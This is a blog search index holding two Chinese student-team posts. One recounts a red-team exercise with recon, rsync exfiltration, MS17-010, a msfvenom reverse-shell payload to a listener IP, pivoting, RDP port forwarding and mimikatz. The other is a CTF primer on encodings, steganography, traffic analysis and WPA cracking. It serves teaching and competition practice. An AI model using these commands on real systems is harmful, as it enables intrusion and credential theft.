<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[RedTeam体验]]></title>
    <url>%2FRedTeam%E4%BD%93%E9%AA%8C.html</url>
    <content type="text"><![CDATA[前言 以下内容，由Stalker成员交流总结，7iny整理。从去年下半年省赛接触渗透，那时我觉得sql注入分值很重。现在才懂得原来内网和权限才是最有价值的东西。这篇文章分为手术前(这部分是yiyangqianxi分享的信息收集内容)、手术中(这部分是手术期间遇到的漏洞)、手术后(这部分是yiyangqianxi的手术总结，我就不造轮子了直接分享他的文章)。经历了这么多，这一件件故事都是有着因果关系的。我希望这篇文章能对学弟学妹们有所帮助。 护腕手术前 因为热爱，所以执着。 信息收集 from: stalker–yiyangqianxi 给定条件 单位名称和单位的主站网址 三种情况1.一般这些政府网站的主站都是托管政务云也就是说 你即使拿到了shell 其实并不是它真正的服务器 是托管的政务云服务器 这种政务云一般的特征是 C段上都是政府网站 部署的WAF都是一样的 DNS解析是一样的 所以碰到这种网站 它的优先级是最低的 2.很多个服务器放在同一个机房里 也就是你去C段查询 发现有很多政府网站 但是他们部署的waf不一样 dns解析也不一样 这种网站 它的C段是有价值的 在你的目标站点没有突破点的时候 可以通过C段上的其他站点做突破点 3.托管个人企业的政府网站 它的特征是 同一C段下很多不相关的网站 这种网站的C段是没有去探测的意义了 所以托管个人企业的优先级最高 突破的难度最低 相关工具及操作Wafw00f：查看使用何种WAF。github下载安装 1python setup.py install 或者1pip install wafw00f DNS查看：nslookup;windows自带 找真实ip的方法是:找子域名,子域名解析出来的ip可能没有用cdn。 端口扫描：nmap有时候会扫不出来，如果这个ip你觉得很重要值得去深入挖掘的话。就用msf的syn扫描 msf 端口扫描模块之synmsf 在 auxiliary 辅助模块下有一个 scanner 扫描分类，其下有一个 portscan 端口扫描，里面有进行端口扫描的基本，不是很多，这里可以使用 search 来搜索下 portscan 关键字，常用的有 tcp、syn 等 search portscan use auxiliary/scanner/portscan/syn 配置并扫描1234show optionsset RHOSTS x.x.x.xset THREADS 100show options 找到的真实ip后去扫C段，看属于上面三种情况的哪种。 云悉:官网,看web服务器,中间件,cms信息 web服务器中间件的漏洞:参考文章 扫目录:御剑.把403的状态也选上，像有些www.rar web.config你可以扫到 但是访问不了 是403 查看同一ip的网站:工具 读取文件：进后台了或者你找到任意文件读取/下载,读取文件 小技巧 ：如果C段一个ip开了80端口，访问发现403 ，也可以扫下它的目录 护腕手术中在手术期间，严老板的思路让我拿到了第一个shell也让我们队伍在前四天一直保持市里第一、高校第一。师弟也疯狂的通过旁站刷分。分享几个有意思的漏洞，交流学习一下 rsync未授权访问漏洞这个是师兄找到的，当我看到这个思路时感觉，这个洞太高端了，直接让某系统，所有信息泄露。 师兄通过端口扫描发现有端口提供了rsync服务,然后你懂的。 1234rsync IP:: //这是在默认条件下没有改变默认的端口，默认密码是::rsync --port=xxx ip:: //如果修改了默认端口就需要指定端口，这里就是需要自己指定47900端口rsync -avz ip::www /tmp //-avz是下载文件的命令，前一个是目标内容，后一个是自己指定存储在本地的路径rsync -avz --port=xxx ip::dddd /tmp 参考文章 一个没申请到CNVD的XSS当时是某平台的机器人自助窗口，随手测试了一下XSS,还真有,拿其他站点试了一下，也是一样存在漏洞的。可惜影响不大没申请到CNVD 一个应该可以申请CNVD的sql注入当时Danie1测试了一个二级域名，随手测出来了一个注入，因为属于一个二级域名一个单位的系统，我觉得应该算一个0day. 一个建站系统的注入学弟在打旁站时，发现多个旁站使用了同一套建站系统，在同一个参数存在sql注入，果断批量刷，该类旁站的注入了，在比赛期间靠这个漏洞学弟疯狂输出. 一个赖皮的蓝方师兄在C段渗透的过程中找到一个未绑定域名的站点并拿下了shell,发现为内网地址，通过搜索发现该地址为该单位的内网地址，没绑定域名，蓝方否认是其财产。MMP否认完第二天就悄悄加固了。 骚思路思路来源，手术期间某晚某邮师兄想使用工作室的服务器，使用某软件不稳定，我随口说了一句使用学校的VPN连接。师兄后来说体验还不错，这为我后来想用VPN打内网提供了思路。在手术期间，内网和权限是爸爸，一般思路是拿到shell打内网。唯一一个shell的服务器不稳定没办法，因为有个手术对象是学校，最后一天学弟直接借了一个VPN账号开打。第一次现学现卖，没什么经验，用msf打445的ms17-010获取权限。10个网段打下来3台服务器，1台PC。30台设备存在0708漏洞。 ps:时间紧很多思路没上来，结合其他队伍的分享回头细想，我应该添加用户开3389,收集数据库，web配置等账号密码信息，撞机器，每撞一台收集一次丰富字典。抓密码mimikata、getpasswd。撞库ntscan MS17-010第一次现学现卖，参考文章按照这篇文章我一步步的打了没有打到。文章中他是先拿的cmdshell再尝试拿meterpreter。严老板说要加个set payload windows/x64/meterpreter/bind_tcp才能打不同网段的设备。32位的为set payload windows/meterpreter/bind_tcp。时间仓促没仔细研究原理。后来打到了3台服务器，1台PC。很满意了，现学现卖收获不菲。这个漏洞不太稳定，我打一台服务器打第二次又失败了。 护腕手术后 yiyangqianxi的渗透总结 写在前面：渗透测试的本质就是信息搜集，不管是渗透前，渗透中，还是渗透后。信息搜集都会使整个渗透过程变得有思路，有目标，有路可走。 信息搜集不管是我刚开始学习渗透时，还是找学长重新入门渗透的时候，第一步告诉我的都是信息搜集，但是在不同的阶段，我对信息搜集的理解也不太一样。很多时候我拿到一个网站，对其就上一顿工具扫这个扫那个，其实都是瞎猫碰死耗子，误打误撞发现了哪里有个漏洞点，就算进了后台，拿到webshell，又懵了，不知道要做什么了。 在这段时间的学习和实践中，我慢慢开始领悟到信息搜集的重要性和多样性。不只是御剑nmap扫了一下网站就够了，从分析网站的结构到判断资产信息都是我们需要考虑的。 拿到一个网站，我们最先看到就是域名。域名可以给到我们什么信息呢？ 1、判断它属于什么类型网站。是学校政府，还是公司，是大型企业网站，还是小型个人网站，是众多旁站的一个小站，还是一个大主站。这很大程度上决定了一次渗透的成功与否。 学校网站：具有很多子站，内网中会有很多服务器（内网渗透会有大收获），C段有利用价值，信息搜集阶段较繁琐，但一旦找到突破口则会很容易造成很大影响。 政府网站：政府网站分为三种类型1、政务云 许多政府网站放在同一个云平台上 难度最大 2、自建机房 许多政府网站在同一个C段上 难度最低 3、个人企业搭建的阿里云/腾讯云平台 难度第二。 其实政府网站不是好目标 如果不是被授权的任务，个人不推荐选择。 大型企业网站：特别大的没挖过，中等的企业网站很多也会选择云服务器，即使拿到webshell也很难突破防火墙等安全策略的干扰，并且后渗透的收获不大。 小型个人网站：有一部分都是不怎么管理的网站，或者是交给其他专门做网站的公司管理，弱口令的可能性较大，即使没有弱口令，总会有可利用的漏洞点，这个作为目标还是不错的。 所以拿到一个网站看到域名，什么edu：学校 gov：政府 这种没有授权最好不要碰。 2、判断网站的结构和语言。云悉是一个很好的指纹识别工具，它可以识别出网站所使用的cms、web服务器、中间件、脚本语言、数据库、操作系统等等对我们有利的信息。 虽然这张图上啥都没识别出来啊。那识别出来的东西我们该怎么利用呢？Cms：知道cms我们就可以去查这个cms的目录结构，已知漏洞，利用默认的路径找到后台，就可以尝试弱口令，爆破之类的了。要是能找到版本号，也就能更精准的找到漏洞。Web服务器：如apache、iis、nginx，都有其对应的漏洞 如apache的解析漏洞，iis的解析漏洞（iis还有cve2017-7269） nginx是一个反向代理服务器，可以很好的保护内网的服务器，与之类似的还有Tengine。Web中间件：weblogic、tomcat、JBOSS 也有对应的漏洞，如常见的weblogic反序列化漏洞。脚本语言：知道了网站的脚本语言，我们可以更好的搜集网站的目录，有些网站还可以解析多种语言。数据库：我们在sql注入的时候，虽然大多数时候都是尝试mysql的语句（因为最简单啊），但其实还有一些数据库语言是有些不一样的，像access数据库一般都是爆破方式，一些小的工具（穿山甲）有时候比sqlmap更好用。操作系统：操作系统有那么多漏洞就不用我多说了吧，windows提权较linux简单多了！ 3、IP好像没那么简单。我们直接ping一个网站的域名得到的ip就是这个网站真实的ip了吗？不，它还有可能是CDN（一种加速服务）。和目标不在同一个地点的ip就一定是CDN了吗？不，它还可能是云服务器，或者是托管个人企业搭建的服务器。 那我们要怎么样找到真实的ip呢？可以用微步在线查看历史解析ip在这里面可能会有真实ip。有时候一些网站的子域名并不会挂CDN（不是所有人都那么有钱的啊） 所以爆破子域名后看ip也可找到真实ip。 4、咋有这么多子域名。Layer子域名挖掘机真好用！有时候我们的渗透目标没有思路的时候，往往可以去它的旁站子站看看，有时候会碰到一些老站点，会有一些新的思路！Ps：某学校就是一个子域名的web漏洞导致内网被打穿。。。有时候子域名还会出现网站的后台之类的让我们惊喜的页面，虽然可能会有点繁琐，但我们有了更多攻击的点了！ 5、C段咋也这么多啊。C段是什么呢？一个ip例如：192.168.109.135 它的C段就是 192.168.109.0-255那它有什么用呢？我们想想，在一个局域网内，我们都在同一个网段下，那当然也处在同一个C段下啦（当然还要看子网掩码） 不过大多数情况子网掩码都是 255.255.255.0 （网络基础知识）C段查询既可以用nmap，msf 也可以在线查询。在线查询我一般用 那个phpinfo.me 所以有可能你的目标机器没有可利用的点，你去C段找一找有没有和它是同一单位或是同一企业的网站，类似于攻击子站旁站了。 6、我把端口给忘了。端口应该都知道很多常见的 22：ssh 80：web服务 445：smb 3306：mysql 3389：远程桌面对一个ip进行端口扫描我们最常用的方法就是nmap，但是有时候nmap不一定扫的出来，我们可以换个工具，msf的portscan模块。Tcp和syn都可以用，虽然扫的比较慢，但是有时候会有一些惊喜。那扫出来一些敏感的端口，我们就可以尝试利用一些漏洞，例如22端口我们可以爆破，445端口的永恒之蓝漏洞和ms08-067，3389最近将会出exp的 cve2019-0708。还有很多漏洞，就不一一说了。 后渗透阶段：拿到webshell的过程我就不说了，想说也说不完，主要说说拿到了一个webshell之后我们要做些什么吧。首先就是要知道自己的权限有多大（能不能执行cmd命令，能不能进其他的目录，能不能上传文件等等）而我一般喜欢msf的meterpreter会话，我们可以生成一个后门来得到一个反弹shell，后门可以生成很多种类型（exe的 php的等等都可以） 只要运行那个后门就可以了。 Msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=你的ip lport=监听的端口 -f exe &gt;test.exe-f :输出木马的类型（可自行选择）但是这里会遇到一个问题，这是一个反弹木马，但是你要攻击的服务器要怎么把会话弹到你的电脑上呢？你的电脑并没有公网ip，它无法访问到，也就无法返回会话了，这时候我们就要用到内网穿透了。 有两种方法：一、用自己的公网服务器和frp来进行穿透（https://blog.csdn.net/u013144287/article/details/78589643/） 二、利用工具natapp来将自己主机进行端口转发 使用natapp就是傻瓜式操作 按照官网的教程配置好就如图所示 这时候去ping这个url得到公网ip然后构造msf木马 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=112.74.89.58 LPORT=45075 -f exe &gt; test.exe上传到服务器一个可读可写目录下在本地msf进行监听use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 0.0.0.0 //可以自动获取ip set LPORT 4444 exploit 然后再用菜刀的虚拟终端运行上传的木马，就可以得到一个meterpreter会话。 我们得到了一个meterpreter会话之后getuid 查自己是什么用户systeminfo 查看服务器系统信息 打了什么补丁getsystem 尝试用msf自带的提权脚本提权 无法提权的话，我们就可以尝试本台服务器上没有打补丁的一些漏洞。但这些漏洞提权都会再次生成一个meterpreter会话，反弹向我们本机的ip，同样，我们无法接收到会话。所以我们可以选择payload为bind_tcp，也就是我们正向去连接它。我们还可以利用烂土豆提权（本地上传一个exe来偷取管理员令牌） 提权还有很多种方法，我们都可以尝试，最重要的是思路。可能我们无法提权这台服务器，但是不用太着急，我们来试试它的内网。 在meterpreter会话界面下 使用命令 arp -a 或者 run get_local_subnets 获取服务器的内网网段 例如我们得到的这台服务器内网网段为 192.168.123.0那我们将当前的会话加入此条路由中backgroundroute add 192.168.123.0 255.255.255.0 1(1是你的session，第几个会话就填几)route print 查看是否已添加成功 现在我们就实现了路由转发 打通了一条去往服务器内网的路我们现在就可以扫描它的内网了 当然优先扫描永恒之蓝啦！这样可以扫描到整个C段上的服务器有哪台有永恒之蓝漏洞，扫到以后就可以直接打那台服务器啦，不过还是之前说过的，打内网服务器的时候要设置payload为bind_tcp，不然会话是无法回来的。那现在我们拿到了内网中的另一台机器，可以用mimikatz来读取管理员的密码，可是我们现在的跳板机权限不够，无法3389连上去，那内网这台也就连不上去了。所以要怎么办呢？就要用到端口转发了。 我们可以把内网中另一台我们已获得权限的机器的3389端口转发到我们跳板机的某个端口，这样访问这个端口就相当于访问内网机器中的3389端口了。使用portfwd add -l 跳板机要设置的端口 -r 内网机器ip -p 3389那么就可以通过访问 跳板机的这个端口来访问内网机器的3389了。]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>Red Team</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF入坑]]></title>
    <url>%2FCTF%E5%85%A5%E5%9D%91.html</url>
    <content type="text"><![CDATA[CTF学习前言本内容主要以解题模式为学习重点，由Stalker-16成员(Danie1,7iny)整理。 day01–7iny解题模式CTF赛题目类别与能力对应· Web-Web应用的漏洞挖掘和利用· PWN-逆向分析、漏洞挖掘、漏洞利用、安全编程· Reverse Engineering-逆向分析、安全编程· Crypto-密码、逆向分析、安全编程· PPC（Professional Programming and Coding）-安全编程· Forensic-网络流量分析、隐写分析、系统取证等· Recon-社工、情报搜集分析 相应的赛题要求PWN、Reverse偏重对汇编、逆向的理解Crypto偏重对数学、算法的深入学习Web偏重对技巧沉淀、快速搜索能力的挑战Misc则更为复杂，所有与计算机安全挑战有关的都算在其中 如何入门–如何学？1、恶补基础知识（有基础的跳过此步） 都需要学的内容：Linux基础、计算机组成原理、操作系统原理、网络协议分析PWN+Reverse+Crypto随机搭配：IDA工具使用（f5插件）、逆向工程、密码学、缓冲区溢出等Web+Misc组合：网络安全、内网渗透、数据库安全等 2、尝试从脑洞开始（hackgame） 1.xss练习平台 2.sql注入挑战 3、从基础题目出发 刷题站点： 1.i春秋 2.xctf攻防世界 3.国外CTF题库 4.国外PWN+Reverse方向 5.ssh连接玩wargame 6.老牌wargame 7.pwn题库 4、学习信息安全专业知识 书籍 PWN+Reverse+Crypto随机搭配：RE for Beginners（逆向工程入门）IDA Pro权威指南揭秘家庭路由器0day漏洞挖掘技术自己动手写操作系统黑客攻防技术宝典：系统实战篇 Web+Misc组合：Web应用安全权威指南Web前端黑客技术揭秘黑客秘籍-渗透测试实用指南黑客攻防技术宝典Web实战篇代码审计：企业级Web代码安全架构 5、锻炼体力而耐力 工具下载 以下是由各大大佬整理的工具库，全部放在了github上 1.工具库1 2.工具库2 3.工具库3 MISC学习学习MISC的好处：MISC可能是切入CTF竞赛领域、培养兴趣的最佳入口1.基础知识/技能面、逆向思维2.“解谜”能力、“脑洞”大开 1.国外：Google Map、Earth、Street View2.国内：Baidu地图、卫星视图、全景视图：map.baidu.com腾讯地图、卫星、街景：map.qq.com· 从网络世界到物理世界1.IP2Location IP地址（因特网上的虚拟地址）&gt;现实世界中的具体地理位置2.IP2Location数据库：WHOIS数据库，GeolP，IP2Location，纯真数据库（QQIP查询使用）· Google image search1.搜索图片含义和外观类似图片 2.Encoding Analysis 编码分析· 二进制编码· 十六进制编码1.单字节：00-FF·ASClI字符编码2.字母：A-Z：41-5A；a-Z：61-7A· Base64编码1.基于64个可打印字符来表示二进制数据的表示方法2.字符集：大小写字母各26个，10个数字，加号“+”，斜杠“/”，一共64个字符，等号“=”用来作为后缀用途· Huffman Code-无损压缩编码，01串显示· 条形码：宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符·国际标准 EAN-13：商品条码标准，13位数字 Code-39：39字符 Code-128：128字符·条形码 在线条码生成器/识别器 ZXing-多平台条形码生成、扫码库条形码在线解码：网站题目1：Barcode.jpeg· 二维码：用某种特定几何图形按一定规律在平面（二维方向上）分布的黑白相间的图形记录数据符号信息1.堆叠式/行排式二维条码：Code 16K、Code49、PDF4172.矩阵式二维码：QR CODE 常见题目二维码、条形码的恢复参考文章：freebuf练习平台：蓝鲸安全打卡练习场参考writeup:简书 练习蓝鲸安全打卡练习场题目：1.破碎的心–画图按住ctrl，按上下键不断还原2.黑白打字机–画图ctrl+shift+i反色，图片隐写解密，86版五笔对照表 图片隐写解密软件下载地址 3.Forensic Analysis 取证分析 · 取证分析-取证对象1.文件file2.磁盘disk3.网络数据包pcap4.内存dump5.系统镜像image· 取证分析挑战目标1.一般为发现在取证对象中隐藏的Flag（代表要取证的敏感信息）2.取证分析通常和隐写分析联系在一起· 文件格式分析常用命令和工具1.基本命令file、identify、strings：用于文件类型探测2.winhex、UE：用于直接察看文件16进制数据3.binwalk：分析二进制文件，提取其中隐藏文件等· 需要了解常见文件特征串1.http://en.wikipedia.org/wiki/List of file signatures2.特别是JPEG、PNG、GIF、BMP等图片文件，ZIP、RAR、TAR、7z等压缩文件，mp3、wma、avi等音视频文件 音频取证· Audacity音频处理软件，查看声音波形 国光音频取证总结 磁盘取证· 磁盘分区格式1.Windows:FAT12-&gt;FAT16-&gt;FAT32-&gt;NTFS2.Linux:EXT2-&gt;EXT3-&gt;EXT43.FAT主磁盘结构 | 主引导区 | 文件分配表#1 | 文件分配表#2 | 根目录 | 其他所有数据剩下磁盘空间 | 删除文件·目录表中文件名第一字节E5·文件恢复和取证工具EasyRecovery、MedAnalyze、FTK网络数据包Pcap取证分析· Wireshark工具书籍《Wireshark抓包分析实战》· 流量统计和会话列表· 善用过滤规则，找出关注的网络流纪录· 流重组：Follow TCP Stream· 常见网络通信协议的理解IP/TCP、UDP/HTTP、DNS、.….·提取流中的文件数据 内存与image镜像取证分析· 内存取证1.Volatility内存镜像分析工具2.解析Windows/Linux/MacOSX内存结构3.分析当前运行进程列表、进程内存数据等4.根据题目提示寻找线索和思路，提取分析指定进程的特定内存数据· Image镜像取证1.Binwalk2.根据题目提示提取镜像中需关注的文件3.分析提取文件中的应用层数据 4.Steganalysis 隐写分析 隐写术· 隐写载体1.文本2.图片3.音频4.视频· 隐写方法和工具1.RSD、LSB、DCT2.https://en.wikipedia.org/wiki/Steganography_tools 国光图片隐写总结 · 识别隐写1.统计分析2.Noise floor consistency analysis 噪声一致性分析· 隐写识别工具1.Stegdetect2.StegSecret3.GFE Stealth· 隐写分析1.http://www.garykessler.net/library/fsc_stego.html day01–Danie1 MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。 例题day01.zip下载网盘链接 提取码: fjru 常见编码 摩斯密码 例： ..-. .-.. .- –. .—- ..— …– ….- ….. -…. http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx 凯撒密码 它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。 例： iodj{dvgi} https://www.qqxiuzi.cn/bianma/kaisamima.php base编码 base16: Base16编码就是将ASCII字符集中可打印的字符(数字0~9和字母A~F)对应的二进制字节数据进行编码 编码的方式: 根据ASCII编码得到对应的二进制,将所有二进制串起来,然后按4个二进制位分割,转化成十进制数值,根据Base16编码表得到编码 例将”ILU”字符串加密 base32: 与Base16编码区别的是,Base32使用了ASCII编码中可打印的32个字符(大写字母A~Z和数字2~7)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充”=” 编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制,将所有二进制串起来,然后按照5个二进制位为一组分割 ,得到十进制值=&gt;找到Base32编码表找到对应的字符.案例总共分割成了5组(25位),还差三组(15位).在末尾补充3个”=”. 例将”ILU”字符串加密 base64: Base64编码使用了ASCII编码中64个可打印的字符(大写字母A~Z,小写字母a~z,数字0~9以及”+”,”/“)将任意字节数据进行编码.Base64编码将串起来的二进制以6位进行分割.所以分切之前的二进制位数应该是24的倍数(即6,8的最小公倍数).如果不足24位,则在编码后数据后面添加”=” 编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制，将串起来的二进制按6位分为一组.得到4组(24位).所以末尾不用补充”=” 例将”ILU”字符串加密 题目 123MzQ0MTM1MzYzNDQ1MzQzNjM0NDYzNTMyMzMzMjM0MzQzNDQzMzQzOTM1NDEzNTM0MzQzNzM1MzQzNDQyMzQzNzM0NDMzNDQxMzQ0MzM1MzUzNTMzMzUzNzM1MzMzNTM1MzQ0MTM0MzIzNDM4MzQzNTM0MzUzNDQ1MzUzMzM1MzIzNDM4MzUzNTMzMzYzNTM0MzMzMjM1MzAzNDM5MzM0NA==flag格式：flag&#123;xxxx&#125; 代码 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/python# -*-coding:utf-8-*-import base64def bs(s): while(1): ok = 0 try: s1 = base64.b64decode(s).decode('ascii') ok = 1 s=s1 except: pass try: s2 = base64.b32decode(s).decode('ascii') ok = 1 s=s2 except: pass try: s3 = base64.b16decode(s).decode('ascii') ok = 1 s=s3 except: pass if ok == 0: break return sif __name__ == "__main__": s = raw_input("请输入字符串:") res = bs(s) print '---------------------------' print 'result:'+ res ascii编码 unicode编码 例：&amp;#102;&amp;#108;&amp;#97;&amp;#103; http://tool.chinaz.com/tools/unicode.aspx MD5 MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一 加密 解密：https://www.cmd5.com/ 题目1 1md5(?)[:6] == &apos;233333&apos; 代码 1234567891011#-*-coding:utf-8-*-import hashlibfor i in range(100000000): m = hashlib.md5() m.update(str(i).encode('utf-8')) res = m.hexdigest() if res[:6] == '233333': print i break 题目2 1已知一段由5个大写字母组成的明文字符串，经过md5加密后的密文前6位为73acd9,求加密前的明文 代码 1234567891011121314151617181920#!/usr/bin/python# -*-coding:utf-8-*-import hashlibletter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'for i in letter: for j in letter: for k in letter: for l in letter: for n in letter: cipher = i+j+k+l+n m = hashlib.md5() m.update(cipher) res = m.hexdigest() if res[:6] == '73acd9': print res print cipher break 异或 相同为0，不同为1 题目 1密文 : FR8SFAgwJzUWASwLHAEsAA4= 代码 12345678910111213141516#!usr/bin/python #-*- coding:utf-8 -*- import base64ming = 'FR8SFAgwJzUWASwLHAEsAA4='mi=base64.b64decode(ming)for j in range(0,127): flag='' for i in range(len(mi)): t=ord(mi[i])^j flag+=chr(t) if 'flag' in flag : print flag break 图片隐写 图片隐写主要考察信息在图片中隐写的几种方法，文件头信息修改，stegsolve工具使用，LSB算法，binwalk工具使用等知识。 常用工具介绍（常用工具下载地址：https://www.ctftools.com/down/） binwalk：是一个固件分析工具，多用于逆向工程、取证、隐写分析 winhex：是在Windows下执行的十六进制编辑软件，此软件功能强大，有完好的分区管理功能和文件管理功能，在CTF中一般用来查看文件头格式、修改16进制数据等。 Stegsolve：是一款图片分析工具，功能十分强大 Stegdetect：是一种数字图像隐写分析工具，主要实现JPEG图像的隐秘信息的嵌入的检测 foremost：和binwalk结合使用，提取隐藏信息。 MP3stego：音频隐写工具 （链接：https://pan.baidu.com/s/1fSSX-e-Q95GY0bftght3Pg提取码：0r3r ）复制这段内容后打开百度网盘手机App，操作更方便哦 用法：隐藏信息 encode -E hidden_text.txt -P pass svega.wav stego.mp3 提取信息 decode -X -P pass svega_stego.mp3 常见文件文件头格式 题目 查看属性 meinv.jpg （易） 查看图片内容 hacker.jpg （易） binwalk + mp3stego 3.jpg （中） binwalk + 伪加密 carefully.jpg （中） （ps：伪加密是在未加密的zip文件基础上修改了它的压缩源文件目录区里的全局方式位标记的比特值，使得压缩软件打开它的时候识别为加密文件，提示输入密码， 而在这个时候，不管你用什么软件对其进行密码破解，都无法打开它） 伪加密（https://blog.csdn.net/qq_26187985/article/details/83654197） 将如图位置的09改为00即可，或者使用工具ZipCenOp.jar (用法 java -jar ZipCenOp.jar r xxx.zip) gif帧 flag.png.gif (易) 压缩包爆破 love.zip （中） LSB隐写 tanwanlanyue （中） 其他 f1ag.png (中) png改高度 dabai.png (中) ps:png文件格式简介： 89 50 4E 47 是文件的格式 00 00 00 0D说明IHDR头块长为13 49 48 44 52 IHDR标识 00 00 01 F4 图像的宽 00 00 01 A4 图像的高 lsb隐写 首先来讲png图片，png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。png图片中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有6777216种。 LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，每个像数可以携带3比特的信息。 day02–7iny内容简介：day02以流量分析，加密解密为主。例题day02.zip下载网盘链接 提取码: fjru Wireshark：Wireshark是目前全球使用最广泛的开源抓包软件（前身为Etherea1），是一个通用化的网络数据嗅探器和协议分析器，由Gerald Combs编写并于1998年以GPL开源许可证发布。 推荐资料：《Wireshark数据包分析实战》第二版Chris Sanders《Wireshark网络分析》第二版Laura Chappe11《TCP/IP协议栈详解卷一》W.Richard Stevens 相关站点：官网下载地址 官方wiki页面 流量分析：流量分析有以下三个方向：1、流量包修复2、协议分析3、数据提取转载来自Yokeen总结 1、流量包修复通常都借助现成的工具例如PCAPFIX直接修复 在线PCAPFIX PCAPFIX下载流量包常见的块，详细介绍可以看：http://www.tcpdump.org/pcap/pcap.html 2、协议分析须掌握wireshark过滤器（捕捉过滤器与显示过滤器）的基础语法，从而更快更精准的获取指定的信息。捕捉过滤器：用于决定将什么样的信息记录在捕捉结果中，需要在开始捕捉前设置。显示过滤器：用于在捕获结果中进行详细查找，可以在得到捕捉结果后进行更改捕捉过滤器基础语法Protocol Direction Host(s) Value LogicalOperations other expressiontcp dst 10.1.1.1 80 and tcp dst 10.2.2.2 3128 Protocol可能的值: ether, fddi, ip, arp, rarp, decnet,lat, sca, moprc, mopdl, tcp and udp，如果没有特别指明是什么协议，则默认使用所有支持的协议。Direction可能的值: src, dst, src and dst, src or dst，如果没有特别指明来源或目的地，则默认使用 “src or dst” 作为关键字。Host(s)可能的值： net, port,host, portrange，如果没有指定此值，则默认使用”host”关键字。例如，”src 10.1.1.1”与”src host 10.1.1.1”相同。Logical Operations可能的值：not, and, or否(“not”)具有最高的优先级，或(“or”)和与(“and”)具有相同的优先级“not tcp port 3128 and tcp port23”与”(not tcp port 3128) and tcp port23”相同。 举例分析：tcp dst port 3128 //目的TCP端口为3128的封包。ip src host 10.1.1.1 //来源IP地址为10.1.1.1的封包。host 10.1.2.3 //目的或来源IP地址为10.1.2.3的封包。src portrange 2000-2500//来源为UDP或TCP，并且端口号在2000至2500范围内的封包not icmp //除了icmp以外的所有封包。 显示过滤器基础语法Protocol String1 String2 ComparisonOperator Value Logical Operations other expressionProtocol可以使用大量位于OSI模型第2至7层的协议。在Expression中可以看到，例如，IP，TCP，DNS，SSHString1，String2可选择显示过滤器右侧表达式，点击父类的+号，然后查看其子类Comparison Oerators可以使用六种比较运算符英文写法：|c语言写法：|含义：-|-|-eq|==|等于|ne|!=|不等于|gt|&gt;|大于|It|&lt;|小于|ge|&gt;=|大于等于|le|&lt;=|小于等于| Logical Expressions英文写法：|c语言写法：|含义：-|-|-and|&amp;&amp;|逻辑与or| |||逻辑或xor| ^^|逻辑异或not| !|逻辑非 举例分析：snmp || dns || icmp //显示SNMP或DNS或ICMP封包ip.addr == 10.1.1.1 //显示源或目的IP为10.1.1.1的封包ip.src != 10.1.2.3 and ip.dst!=10.4.5.6 //显示源不为10.1.2.3并且目的不为10.4.5.6的封包tcp.port == 25 //显示来源或目的TCP端口号为25的封包tcp.dport == 25 //显示目的TCP端口号为25的封包 如果过滤器语法是正确的，表达式背景为绿色，否则为红色前文中的wireshark文件还原就可以说是一个很基础的数据包流量分析。 数据提取这一块是流量包中另一个重点，通过对协议分析，找到题目的关键点，从而对所需要的数据进行提取。 可以学习一下tshark的使用tshark作为wireshark的命令行版，高效快捷是它的优点，配合其余命令行工具(awk,grep)等灵活使用，可以快速定位，提取数据从而省去了繁杂的脚本编写 1常用方法：tshark -r *.pcap -Y ** -T fields -e **|***&gt;data 题目1、MISC.rar key为文本格式，你找得到吗？ 用wireshark打开数据包，在文件 -&gt; 导出对象中，选择HTTP-&gt;保存txt文件 题目2、A记录（蓝鲸） 他在看什么视频，好像很好看，不知道是什么网站的。 还好我截取了他的数据包，找呀找。 key就是网站名称。格式ctf{key} tip:A记录的第一条。所以答案是 ps:在数据包分析工具中，看到的都是加密后的802.11协议的数据包，而无法看到数据包的原始内容。为了方便分析，aircrack-ng工具包提供了一个专用解密工具airdecap-ng。kali自带 1.aircrack-ng shipin.cap -w password.txt2.airdecap-ng shipin.cap -e 0719 -p 888888883.top1000弱口令下载 题目3、好多苍蝇【蓝鲸】 好多苍蝇啊，吧我的重要文件都爬满了，看不到怎么办？提交格式是flag{xxxx},所以答案是？ 738数据包，导出application/octet-stream的数据流，删除(00000160,B)之前的都是不需要的数据，拼接数据。伪加密，foremost分离。Tools：hxD:下载类似软件，了解不推荐winhex:下载Notepad++ 16进制编辑功能:下载UNI解压缩后把HexEditor.dll文件复制到安装目录（如Notepad++\plugins），退出需要以十六进制显示时，点击菜单的：【插件】－【Hex-Editor】－【View in Hex】即可。 参考文章:1.某大佬给新疆电网培训MISC总结) 2.流量分析–ctf实战 3.流量分析–HTTP认识 4.蓝鲸安全CTF打卡第一期杂项篇WriteUp 5.蓝鲸安全30day打卡Writeup 